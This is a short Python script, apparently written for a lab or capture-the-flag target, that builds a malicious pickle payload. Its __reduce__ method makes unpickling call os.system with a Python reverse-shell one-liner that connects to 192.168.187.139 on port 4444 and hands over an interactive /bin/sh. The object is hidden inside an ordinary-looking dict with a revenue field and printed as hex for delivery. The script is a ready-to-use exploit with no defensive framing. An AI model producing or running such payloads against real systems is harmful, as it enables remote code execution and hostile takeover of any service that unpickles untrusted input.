import pickle
import base64


class Exploit:
    def __reduce__(self):
        # return (eval, ("__import__('os').popen('ls -la').read()",))
        import os
        cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.187.139\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

data = {'user': Exploit(), 'revenue': '85000'}

pickled = pickle.dumps(data)


print(pickled.hex())